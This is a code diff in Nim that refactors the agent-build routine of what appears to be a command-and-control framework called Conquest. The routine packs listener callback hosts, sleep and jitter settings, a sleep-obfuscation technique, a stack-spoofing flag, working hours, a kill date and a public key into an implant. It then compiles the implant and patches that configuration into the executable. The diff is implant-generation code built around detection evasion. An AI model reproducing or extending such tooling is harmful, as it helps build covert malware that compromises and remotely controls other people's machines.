@@ -1,14 +1,13 @@
 import terminal, strformat, strutils, sequtils, tables, system, osproc, streams, parsetoml
 
 import ../globals
-import ../core/logger
+import ../core/[logger, websocket]
 import ../db/database 
 import ../../common/[types, utils, serialize, crypto]
-import ../websocket
 
 const PLACEHOLDER = "PLACEHOLDER"
 
-proc serializeConfiguration(cq: Conquest, listener: Listener, sleep: int, sleepTechnique: SleepObfuscationTechnique, spoofStack: bool): seq[byte] = 
+proc serializeConfiguration(cq: Conquest, listener: Listener, sleepSettings: SleepSettings, killDate: int64): seq[byte] = 
     
     var packer = Packer.init()
 
@@ -17,13 +16,23 @@ proc serializeConfiguration(cq: Conquest, listener: Listener, sleep: int, sleepT
 
     # Listener configuration
     packer.add(string.toUuid(listener.listenerId))
-    packer.addDataWithLengthPrefix(string.toBytes(listener.address))
-    packer.add(uint32(listener.port))
+    packer.addDataWithLengthPrefix(string.toBytes(listener.hosts))
 
     # Sleep settings
-    packer.add(uint32(sleep))
-    packer.add(uint8(sleepTechnique))
-    packer.add(uint8(spoofStack))
+    packer.add(sleepSettings.sleepDelay)
+    packer.add(sleepSettings.jitter)
+    packer.add(uint8(sleepSettings.sleepTechnique))
+    packer.add(uint8(sleepSettings.spoofStack))
+    
+    # Working hours
+    packer.add(uint8(sleepSettings.workingHours.enabled))
+    packer.add(uint32(sleepSettings.workingHours.startHour))
+    packer.add(uint32(sleepSettings.workingHours.startMinute))
+    packer.add(uint32(sleepSettings.workingHours.endHour))
+    packer.add(uint32(sleepSettings.workingHours.endMinute))
+
+    # Kill date
+    packer.add(uint64(killDate))
 
     # Public key for key exchange
     packer.addData(cq.keyPair.publicKey)
@@ -62,7 +71,7 @@ proc replaceAfterPrefix(content, prefix, value: string): string =
             it
     ).join("\n")
     
-proc compile(cq: Conquest, placeholderLength: int, modules: uint32): string = 
+proc compile(cq: Conquest, placeholderLength: int, modules: uint32, verbose: bool): string = 
     
     let 
         configFile = fmt"{CONQUEST_ROOT}/src/agent/nim.cfg"  
@@ -79,6 +88,7 @@ proc compile(cq: Conquest, placeholderLength: int, modules: uint32): string =
                     .replaceAfterPrefix("-d:CONFIGURATION=", placeholder)    
                     .replaceAfterPrefix("-o:", exeFile)
                     .replaceAfterPrefix("-d:MODULES=", $modules)
+                    .replaceAfterPrefix("-d:VERBOSE=", $verbose)
     writeFile(configFile, config)
 
     cq.info(fmt"Placeholder created ({placeholder.len()} bytes).")
@@ -148,18 +158,18 @@ proc patch(cq: Conquest, unpatchedExePath: string, configuration: seq[byte]): se
     return @[]
 
 # Agent generation 
-proc agentBuild*(cq: Conquest, listenerId: string, sleepDelay: int, sleepTechnique: SleepObfuscationTechnique, spoofStack: bool, modules: uint32): seq[byte] =
+proc agentBuild*(cq: Conquest, agentBuildInformation: AgentBuildInformation): seq[byte] =
 
     # Verify that listener exists
-    if not cq.dbListenerExists(listenerId.toUpperAscii): 
-        cq.error(fmt"Listener {listenerId.toUpperAscii} does not exist.")
+    if not cq.dbListenerExists(agentBuildInformation.listenerId): 
+        cq.error(fmt"Listener {agentBuildInformation.listenerId} does not exist.")
         return
 
-    let listener = cq.listeners[listenerId.toUpperAscii]
+    let listener = cq.listeners[agentBuildInformation.listenerId]
     
-    var config = cq.serializeConfiguration(listener, sleepDelay, sleepTechnique, spoofStack)
+    var config = cq.serializeConfiguration(listener, agentBuildInformation.sleepSettings, agentBuildInformation.killDate)
     
-    let unpatchedExePath = cq.compile(config.len, modules)
+    let unpatchedExePath = cq.compile(config.len(), agentBuildInformation.modules, agentBuildInformation.verbose)
     if unpatchedExePath.isEmptyOrWhitespace():
         return 
 
